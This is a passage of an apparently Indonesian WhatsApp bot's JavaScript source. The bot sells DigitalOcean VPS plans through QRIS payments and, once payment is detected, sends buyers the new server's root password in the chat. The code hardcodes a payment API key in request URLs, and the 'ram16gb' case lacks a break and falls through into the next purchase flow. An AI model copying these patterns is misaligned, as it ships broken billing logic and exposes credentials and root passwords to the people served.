Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

case 'rebuild': {
if (!isCreator) return m.reply('Khusus Own')
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
cupen.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

case 'restartvps': {
if (!isCreator) return m.reply('Khusus Own')
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

;

case 'ram16gb':
{
try {
const vpsPrice = global.ram1;
const amount = vpsPrice;
const fee = Math.floor(Math.random() * 101);
const totalAmount = amount + fee;

const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${totalAmount}&codeqr=${qrisorkut}`)).json();

const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000);

const hours = expirationTime.getHours().toString().padStart(2, '0');
const minutes = expirationTime.getMinutes().toString().padStart(2, '0');
const formattedTime = `${hours}:${minutes}`;

const paymentDetails = `*DETAIL PEMBAYARAN 🟢* 

* *RAM VPS:* Ram 16Gb Core 4
* *Region:* Singapore
* *OS:* Ubuntu 20.04

* 🔥 ID TRANSAKSI : ${pay.result.transactionId}
* 💸 JUMLAH TRANSAKSI : Rp. ${amount}
* 🕐 EXPIRED : ${formattedTime} WIB
* 📚 BIAYA ADMIN : ${fee}
* 🦠 TOTAL : ${totalAmount}

Silahkan scan QRIS di atas sebelum 5 Menit untuk pembayaran.`;

const qrMessage = await cupen.sendMessage(m.chat, { 
image: { url: pay.result.qrImageUrl }, 
caption: paymentDetails 
}, { quoted: m });

const apiUrl = `https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`;
let isTransactionComplete = false;
const maxWaitTime = 5 * 60 * 1000;
const startTime = Date.now();

while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
try {
const response = await axios.get(apiUrl);
const result = response.data;

if (result && result.amount && parseInt(result.amount) === totalAmount) {
isTransactionComplete = true;

await cupen.sendMessage(m.chat, { 
delete: qrMessage.key 
});

const dropletData = {
name: "root",
region: "blr1",
size: "s-4vcpu-16gb-amd",
image: "ubuntu-22-04-x64",
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

const password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

const doResponse = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
},
body: JSON.stringify(dropletData)
});

const doData = await doResponse.json();
if (doResponse.ok) {
const dropletId = doData.droplet.id;
await cupen.sendMessage(m.chat, { 
text: `*✅️PEMBAYARAN BERHASIL!*

* *📚 ID Transaksi : ${pay.result.transactionId}*
* *🦠 Jumlah Tambahkan : Rp.${amount}*
* *💸 Saldo Anda : Rp.${result.balance}*
* *📚 Payment Yang Digunakan : ${result.brand_name}*

Sedang memproses pembuatan VPS...\nMohon tunggu sekitar 1 menit.`
}, { quoted: m });

await new Promise(resolve => setTimeout(resolve, 60000));

const dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
}
});

const dropletInfo = await dropletResponse.json();
const ipVPS = dropletInfo.droplet.networks.v4?.[0]?.ip_address || "IP belum tersedia";
const vpsDetails = `*-# ✅️PESANAN VPS BERHASIL!*

* *RAM VPS :* ${dropletId}
* *Region Vps :* Singapore
* *OS :* Ubuntu 22.04
* *IP VPS : ${ipVPS}*
* *Hostname :* root
* *Username : root* 
* *Password :* ${password}

*-# ❗️Rules*
Dilarang Digunakan Untuk Kegiatan ilegal Seperti Maining, Ddos, Atau Aktivitas Terlarang Lainnya`;

await cupen.sendMessage(m.chat, { image: { url: 'https://files.catbox.moe/ld1o34.jpg' }, caption: vpsDetails }, { quoted: m });

const fs = require('fs');
const usersFilePath = 'src/users.json';
let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));
const userNumber = `${m.sender}`;

let user = usersData.find(user => user.nomer === userNumber);
if (!user) {
user = {
nomer: userNumber,
vps_history: []
};
usersData.push(user);
}

if (!user.vps_history) user.vps_history = [];

user.vps_history.push({
date: new Date().toISOString(),
dropletId: dropletId,
ip: ipVPS,
amount: totalAmount
});

fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
} else {
throw new Error(doData.message || 'Gagal membuat VPS');
}
}
} catch (error) {
console.error('Error:', error);
await cupen.sendMessage(m.chat, { 
text: 'Terjadi kesalahan saat membuat VPS. Silakan hubungi admin.' 
}, { quoted: m });
break;

}

if (!isTransactionComplete) {
await new Promise(resolve => setTimeout(resolve, 10000));
}
}

if (!isTransactionComplete) {
const expiredText = `*WAKTU PEMBAYARAN TELAH HABIS!*\n\nTransaksi Anda telah melebihi batas waktu untuk melakukan pembayaran.\nSilakan coba lagi dengan membuat transaksi baru.`;
await cupen.sendMessage(m.chat, { text: expiredText }, { quoted: m });
await cupen.sendMessage(m.chat, { 
delete: qrMessage.key 
});
}

} catch (error) {
console.error('Error:', error);
reply('Terjadi kesalahan dalam proses pembelian VPS. Silakan coba lagi nanti.');
}
}

case 'ram1gb': {
try {
const vpsPrice = 15000;
const amount = vpsPrice;
const fee = Math.floor(Math.random() * 0);
const totalAmount = amount + fee;

const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${totalAmount}&codeqr=${qrisorkut}`)).json();

const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000);

// Format the expiration time
const hours = expirationTime.getHours().toString().padStart(2, '0');
const minutes = expirationTime.getMinutes().toString().padStart(2, '0');
const formattedTime = `${hours}:${minutes}`;

const paymentDetails = `*DETAIL PEMBAYARAN 🟢* 

* *RAM VPS:* Ram 1Gb Core 1
* *Region:* Singapore
* *OS:* Ubuntu 20.04

* 🔥 ID TRANSAKSI : ${pay.result.transactionId}
* 💸 JUMLAH TRANSAKSI : Rp. ${amount}
* 🕐 EXPIRED : ${formattedTime} WIB
* 📚 BIAYA ADMIN : ${fee}
* 🦠 TOTAL : ${totalAmount}

Silahkan scan QRIS di atas sebelum 5 Menit untuk pembayaran.`;

const qrMessage = await cupen.sendMessage(m.chat, { 
image: { url: pay.result.qrImageUrl }, 
caption: paymentDetails 
}, { quoted: m });

const apiUrl = `https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`;
let isTransactionComplete = false;
const maxWaitTime = 5 * 60 * 1000;
const startTime = Date.now();

while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
try {
const response = await axios.get(apiUrl);
const result = response.data;

if (result && result.amount && parseInt(result.amount) === totalAmount) {
isTransactionComplete = true;

await cupen.sendMessage(m.chat, { 
delete: qrMessage.key 
});

const dropletData = {
name: "root",
region: "sgp1",
size: "s-1vcpu-1gb",
image: "ubuntu-22-04-x64",
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

const password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

const doResponse = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
},
body: JSON.stringify(dropletData)
});

const doData = await doResponse.json();
if (doResponse.ok) {
const dropletId = doData.droplet.id;
await cupen.sendMessage(m.chat, { 
text: `*✅️PEMBAYARAN BERHASIL!*

* *📚 ID Transaksi : ${pay.result.transactionId}*
* *🦠 Jumlah Tambahkan : Rp.${amount}*
* *💸 Saldo Anda : Rp.${result.balance}*
* *📚 Payment Yang Digunakan : ${result.brand_name}*

Sedang memproses pembuatan VPS...\nMohon tunggu sekitar 1 menit.`
}, { quoted: m });

await new Promise(resolve => setTimeout(resolve, 60000));

const dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
}
});

const dropletInfo = await dropletResponse.json();
const ipVPS = dropletInfo.droplet.networks.v4?.[0]?.ip_address || "IP belum tersedia";
const vpsDetails = `*-# ✅️PESANAN VPS BERHASIL!*

* *RAM VPS :* ${dropletId}
* *Region Vps :* Singapore
* *OS :* Ubuntu 22.04
* *IP VPS : ${ipVPS}*
* *Hostname :* root
* *Username : root* 
* *Password :* ${password}

*-# ❗️Rules*
Dilarang Digunakan Untuk Kegiatan ilegal Seperti Maining, Ddos, Atau Aktivitas Terlarang Lainnya`;

await cupen.sendMessage(m.chat, { 
image: { url: 'https://files.catbox.moe/ld1o34.jpg' }, 
caption: vpsDetails 
}, { quoted: m });

const fs = require('fs');
const usersFilePath = 'src/users.json';
let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));
const userNumber = `${m.sender}`;

let user = usersData.find(user => user.nomer === userNumber);
if (!user) {
user = {
nomer: userNumber,
vps_history: []
};
usersData.push(user);
}

if (!user.vps_history) user.vps_history = [];

user.vps_history.push({
date: new Date().toISOString(),
dropletId: dropletId,
ip: ipVPS,
amount: totalAmount
});

fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
} else {
throw new Error(doData.message || 'Gagal membuat VPS');
}
}
} catch (error) {
console.error('Error:', error);
await cupen.sendMessage(m.chat, { 
text: 'Terjadi kesalahan saat membuat VPS. Silakan hubungi admin.' 
}, { quoted: m });
break;
}

if (!isTransactionComplete) {
await new Promise(resolve => setTimeout(resolve, 10000));
}
}

if (!isTransactionComplete) {
const expiredText = `*WAKTU PEMBAYARAN TELAH HABIS!*\n\nTransaksi Anda telah melebihi batas waktu untuk melakukan pembayaran.\nSilakan coba lagi dengan membuat transaksi baru.`;
await cupen.sendMessage(m.chat, { text: expiredText }, { quoted: m });
await cupen.sendMessage(m.chat, { 
delete: qrMessage.key 
});
}

} catch (error) {
console.error('Error:', error);
reply('Terjadi kesalahan dalam proses pembelian VPS. Silakan coba lagi nanti.');
}
}
break
case 'ram2gb': {
try {
const vpsPrice = 35000;
const amount = vpsPrice;
const fee = Math.floor(Math.random() * 12);
const totalAmount = amount + fee;

const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${totalAmount}&codeqr=${qrisorkut}`)).json();

const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000);

// Format the expiration time
const hours = expirationTime.getHours().toString().padStart(2, '0');
const minutes = expirationTime.getMinutes().toString().padStart(2, '0');
const formattedTime = `${hours}:${minutes}`;

const paymentDetails = `*DETAIL PEMBAYARAN 🟢* 

* *RAM VPS:* Ram 2Gb Core 1
* *Region:* Singapore
* *OS:* Ubuntu 20.04

* 🔥 ID TRANSAKSI : ${pay.result.transactionId}
* 💸 JUMLAH TRANSAKSI : Rp. ${amount}
* 🕐 EXPIRED : ${formattedTime} WIB
* 📚 BIAYA ADMIN : ${fee}
* 🦠 TOTAL : ${totalAmount}

Silahkan scan QRIS di atas sebelum 5 Menit untuk pembayaran.`;

const qrMessage = await cupen.sendMessage(m.chat, { 
image: { url: pay.result.qrImageUrl }, 
caption: paymentDetails 
}, { quoted: m });

const apiUrl = `https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`;
let isTransactionComplete = false;
const maxWaitTime = 5 * 60 * 1000;
const startTime = Date.now();

while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
try {
const response = await axios.get(apiUrl);
const result = response.data;

if (result && result.amount && parseInt(result.amount) === totalAmount) {
isTransactionComplete = true;

await cupen.sendMessage(m.chat, { 
delete: qrMessage.key 
});

const dropletData = {
name: "root",
region: "sgp1",
size: "s-1vcpu-2gb",
image: "ubuntu-22-04-x64",
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

const password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

const doResponse = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
},
body: JSON.stringify(dropletData)
});

const doData = await doResponse.json();
if (doResponse.ok) {
const dropletId = doData.droplet.id;
await cupen.sendMessage(m.chat, { 
text: `*✅️PEMBAYARAN BERHASIL!*

* *📚 ID Transaksi : ${pay.result.transactionId}*
* *🦠 Jumlah Tambahkan : Rp.${amount}*
* *💸 Saldo Anda : Rp.${result.balance}*
* *📚 Payment Yang Digunakan : ${result.brand_name}*

Sedang memproses pembuatan VPS...\nMohon tunggu sekitar 1 menit.`
}, { quoted: m });

await new Promise(resolve => setTimeout(resolve, 60000));

const dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
}
});

const dropletInfo = await dropletResponse.json();
const ipVPS = dropletInfo.droplet.networks.v4?.[0]?.ip_address || "IP belum tersedia";
const vpsDetails = `*-# ✅️PESANAN VPS BERHASIL!*

* *RAM VPS :* ${dropletId}
* *Region Vps :* Singapore
* *OS :* Ubuntu 22.04
* *IP VPS : ${ipVPS}*
* *Hostname :* root
* *Username : root* 
* *Password :* ${password}

*-# ❗️Rules*
Dilarang Digunakan Untuk Kegiatan ilegal Seperti Maining, Ddos, Atau Aktivitas Terlarang Lainnya`;

await cupen.sendMessage(m.chat, { 
image: { url: 'https://files.catbox.moe/ld1o34.jpg' }, 
caption: vpsDetails 
}, { quoted: m });

const fs = require('fs');
const usersFilePath = 'src/users.json';
let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));
const userNumber = `${m.sender}`;

let user = usersData.find(user => user.nomer === userNumber);
if (!user) {
user = {
nomer: userNumber,
vps_history: []
};
usersData.push(user);
}

if (!user.vps_history) user.vps_history = [];

user.vps_history.push({
date: new Date().toISOString(),
dropletId: dropletId,
ip: ipVPS,
amount: totalAmount
});

fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
} else {
throw new Error(doData.message || 'Gagal membuat VPS');
}
}
} catch (error) {
console.error('Error:', error);
await cupen.sendMessage(m.chat, { 
text: 'Terjadi kesalahan saat membuat VPS. Silakan hubungi admin.' 
}, { quoted: m });
break;
}

if (!isTransactionComplete) {
await new Promise(resolve => setTimeout(resolve, 10000));
}
}

if (!isTransactionComplete) {
const expiredText = `*WAKTU PEMBAYARAN TELAH HABIS!*\n\nTransaksi Anda telah melebihi batas waktu untuk melakukan pembayaran.\nSilakan coba lagi dengan membuat transaksi baru.`;
await cupen.sendMessage(m.chat, { text: expiredText }, { quoted: m });
await cupen.sendMessage(m.chat, { 
delete: qrMessage.key 
});
}

} catch (error) {
console.error('Error:', error);
reply('Terjadi kesalahan dalam proses pembelian VPS. Silakan coba lagi nanti.');
}
}
break
case 'ram4gb': {
try {
const vpsPrice = 45000;
const amount = vpsPrice;
const fee = Math.floor(Math.random() * 12);
const totalAmount = amount + fee;

const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${totalAmount}&codeqr=${qrisorkut}`)).json();

const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000);

// Format the expiration time
const hours = expirationTime.getHours().toString().padStart(2, '0');
const minutes = expirationTime.getMinutes().toString().padStart(2, '0');
const formattedTime = `${hours}:${minutes}`;

const paymentDetails = `*DETAIL PEMBAYARAN* 

* *RAM VPS:* Ram 4Gb Core 2
* *Region:* Singapore
* *OS:* Ubuntu 20.04

* 🔥 ID TRANSAKSI : ${pay.result.transactionId}
* 💸 JUMLAH TRANSAKSI : Rp. ${amount}
* 🕐 EXPIRED : ${formattedTime} WIB
* 📚 BIAYA ADMIN : ${fee}
* 🦠 TOTAL : ${totalAmount}

Silahkan scan QRIS di atas sebelum 5 Menit untuk pembayaran.`;

const qrMessage = await cupen.sendMessage(m.chat, { 
image: { url: pay.result.qrImageUrl }, 
caption: paymentDetails 
}, { quoted: m });

const apiUrl = `https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`;
let isTransactionComplete = false;
const maxWaitTime = 5 * 60 * 1000;
const startTime = Date.now();

while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
try {
const response = await axios.get(apiUrl);
const result = response.data;

if (result && result.amount && parseInt(result.amount) === totalAmount) {
isTransactionComplete = true;

await cupen.sendMessage(m.chat, { 
delete: qrMessage.key 
});

const dropletData = {
name: "root",
region: "sgp1",
size: "s-2vcpu-4gb",
image: "ubuntu-22-04-x64",
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

const password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

const doResponse = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
},
body: JSON.stringify(dropletData)
});

const doData = await doResponse.json();
if (doResponse.ok) {
const dropletId = doData.droplet.id;
await cupen.sendMessage(m.chat, { 
text: `*✅️PEMBAYARAN BERHASIL!*

* *📚 ID Transaksi : ${pay.result.transactionId}*
* *🦠 Jumlah Tambahkan : Rp.${amount}*
* *💸 Saldo Anda : Rp.${result.balance}*
* *📚 Payment Yang Digunakan : ${result.brand_name}*

Sedang memproses pembuatan VPS...\nMohon tunggu sekitar 1 menit.`
}, { quoted: m });

await new Promise(resolve => setTimeout(resolve, 60000));

const dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
}
});

const dropletInfo = await dropletResponse.json();
const ipVPS = dropletInfo.droplet.networks.v4?.[0]?.ip_address || "IP belum tersedia";
const vpsDetails = `*-# ✅️PESANAN VPS BERHASIL!*

* *RAM VPS :* ${dropletId}
* *Region Vps :* Singapore
* *OS :* Ubuntu 22.04
* *IP VPS : ${ipVPS}*
* *Hostname :* root
* *Username : root* 
* *Password :* ${password}

*-# ❗️Rules*
Dilarang Digunakan Untuk Kegiatan ilegal Seperti Maining, Ddos, Atau Aktivitas Terlarang Lainnya`;

await cupen.sendMessage(m.chat, { 
image: { url: 'https://files.catbox.moe/ld1o34.jpg' }, 
caption: vpsDetails 
}, { quoted: m });

const fs = require('fs');
const usersFilePath = 'src/users.json';
let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));
const userNumber = `${m.sender}`;

let user = usersData.find(user => user.nomer === userNumber);
if (!user) {
user = {
nomer: userNumber,
vps_history: []
};
usersData.push(user);
}

if (!user.vps_history) user.vps_history = [];

user.vps_history.push({
date: new Date().toISOString(),
dropletId: dropletId,
ip: ipVPS,
amount: totalAmount
});

fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
} else {
throw new Error(doData.message || 'Gagal membuat VPS');
}
}
} catch (error) {
console.error('Error:', error);
await cupen.sendMessage(m.chat, { 
text: 'Terjadi kesalahan saat membuat VPS. Silakan hubungi admin.' 
}, { quoted: m });
break;
}

if (!isTransactionComplete) {
await new Promise(resolve => setTimeout(resolve, 10000));
}
}

if (!isTransactionComplete) {
const expiredText = `*WAKTU PEMBAYARAN TELAH HABIS!*\n\nTransaksi Anda telah melebihi batas waktu untuk melakukan pembayaran.\nSilakan coba lagi dengan membuat transaksi baru.`;
await cupen.sendMessage(m.chat, { text: expiredText }, { quoted: m });
await cupen.sendMessage(m.chat, { 
delete: qrMessage.key 
});
}

} catch (error) {
console.error('Error:', error);
reply('Terjadi kesalahan dalam proses pembelian VPS. Silakan coba lagi nanti.');
}
}
break
case 'ram8gb': {
try {
const vpsPrice = 60000;
const amount = vpsPrice;
const fee = Math.floor(Math.random() * 10);
const totalAmount = amount + fee;

const pay = await (await fetch(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${totalAmount}&codeqr=${qrisorkut}`)).json();

const jakartaTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
const expirationTime = new Date(jakartaTime.getTime() + 5 * 60 * 1000);

// Format the expiration time
const hours = expirationTime.getHours().toString().padStart(2, '0');
const minutes = expirationTime.getMinutes().toString().padStart(2, '0');
const formattedTime = `${hours}:${minutes}`;

const paymentDetails = `*DETAIL PEMBAYARAN* 

* *RAM VPS:* Ram 8Gb Core 4
* *Region:* Singapore
* *OS:* Ubuntu 20.04

* 🔥 ID TRANSAKSI : ${pay.result.transactionId}
* 💸 JUMLAH TRANSAKSI : Rp. ${amount}
* 🕐 EXPIRED : ${formattedTime} WIB
* 📚 BIAYA ADMIN : ${fee}
* 🦠 TOTAL : ${totalAmount}

Silahkan scan QRIS di atas sebelum 5 Menit untuk pembayaran.`;

const qrMessage = await cupen.sendMessage(m.chat, { 
image: { url: pay.result.qrImageUrl }, 
caption: paymentDetails 
}, { quoted: m });

const apiUrl = `https://aanapi.my.id/api/orkut/cekstatus?apikey=aanboy&merchant=${idmerchant}&keyorkut=${apikeyorkut}`;
let isTransactionComplete = false;
const maxWaitTime = 5 * 60 * 1000;
const startTime = Date.now();

while (!isTransactionComplete && Date.now() - startTime < maxWaitTime) {
try {
const response = await axios.get(apiUrl);
const result = response.data;

if (result && result.amount && parseInt(result.amount) === totalAmount) {
isTransactionComplete = true;

await cupen.sendMessage(m.chat, { 
delete: qrMessage.key 
});

const dropletData = {
name: "root",
region: "sgp1",
size: "s-4vcpu-8gb",
image: "ubuntu-22-04-x64",
ssh_keys: null,
backups: false,
ipv6: true,
user_data: null,
private_networking: null,
volumes: null,
tags: ['T']
};

const password = generateRandomPassword();
dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

const doResponse = await fetch('https://api.digitalocean.com/v2/droplets', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
},
body: JSON.stringify(dropletData)
});

const doData = await doResponse.json();
if (doResponse.ok) {
const dropletId = doData.droplet.id;
await cupen.sendMessage(m.chat, { 
text: `*✅️PEMBAYARAN BERHASIL!*

* *📚 ID Transaksi : ${pay.result.transactionId}*
* *🦠 Jumlah Tambahkan : Rp.${amount}*
* *💸 Saldo Anda : Rp.${result.balance}*
* *📚 Payment Yang Digunakan : ${result.brand_name}*

Sedang memproses pembuatan VPS...\nMohon tunggu sekitar 1 menit.`
}, { quoted: m });

await new Promise(resolve => setTimeout(resolve, 60000));

const dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.digitalocean_apikey}`
}
});

const dropletInfo = await dropletResponse.json();
const ipVPS = dropletInfo.droplet.networks.v4?.[0]?.ip_address || "IP belum tersedia";
const vpsDetails = `*-# ✅️PESANAN VPS BERHASIL!*

* *RAM VPS :* ${dropletId}
* *Region Vps :* Singapore
* *OS :* Ubuntu 22.04
* *IP VPS : ${ipVPS}*
* *Hostname :* root
* *Username : root* 
* *Password :* ${password}

*-# ❗️Rules*
Dilarang Digunakan Untuk Kegiatan ilegal Seperti Maining, Ddos, Atau Aktivitas Terlarang Lainnya`;

await cupen.sendMessage(m.chat, { 
image: { url: 'https://files.catbox.moe/ld1o34.jpg' }, 
caption: vpsDetails 
}, { quoted: m });

const fs = require('fs');
const usersFilePath = 'src/users.json';
let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));
const userNumber = `${m.sender}`;

let user = usersData.find(user => user.nomer === userNumber);
if (!user) {
user = {
nomer: userNumber,
vps_history: []
};
usersData.push(user);
}

if (!user.vps_history) user.vps_history = [];

user.vps_history.push({
date: new Date().toISOString(),
dropletId: dropletId,
ip: ipVPS,
amount: totalAmount
});

fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
} else {
throw new Error(doData.message || 'Gagal membuat VPS');
}
}
} catch (error) {
console.error('Error:', error);
await cupen.sendMessage(m.chat, { 
text: 'Terjadi kesalahan saat membuat VPS. Silakan hubungi admin.' 
}, { quoted: m });
break;
}

if (!isTransactionComplete) {
await new Promise(resolve => setTimeout(resolve, 10000));
}
}

if (!isTransactionComplete) {
const expiredText = `*WAKTU PEMBAYARAN TELAH HABIS!*\n\nTransaksi Anda telah melebihi batas waktu untuk melakukan pembayaran.\nSilakan coba lagi dengan membuat transaksi baru.`;
await cupen.sendMessage(m.chat, { text: expiredText }, { quoted: m });
await cupen.sendMessage(m.chat, { 
delete: qrMessage.key 
});
}

} catch (error) {
console.error('Error:', error);
reply('Terjadi kesalahan dalam proses pembelian VPS. Silakan coba lagi nanti.');
}
}
break

case 'buyadp': {
  if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat");
  if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  // Generate Nama Acak
  const generateRandomUsername = () => {
    const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let randomUsername = '';
    for (let i = 0; i < 8; i++) { // Panjang username acak (8 karakter)
      randomUsername += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return randomUsername;
  };

  let us = crypto.randomBytes(2).toString('hex');
  let Obj = {};
  Obj.harga = "2"; 
  Obj.username = generateRandomUsername() + us; // Menggunakan nama acak
  const UrlQr = global.qrisOrderKuota;

  const amount = Number(Obj.harga) + generateRandomNumber(110, 250);
  const get = await axios.get(`https://aanapi.my.id/api/orkut/createpayment?apikey=aanboy&amount=${amount}&codeqr=${qrisorkut}`);
  const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`;

  let msgQr = await cupen.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teks3 }, { quoted: m });
  db.users[m.sender].status_deposit = true;
  db.users[m.sender].saweria = {
    msg: msgQr,
    chat: m.sender,
    idDeposit: get.data.result.transactionId,
    amount: get.data.result.amount.toString(),
    exp: function () {
      setTimeout(async () => {
        if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
          await cupen.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
          await cupen.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
          db.users[m.sender].status_deposit = false;
          await clearInterval(db.users[m.sender].saweria.exp);
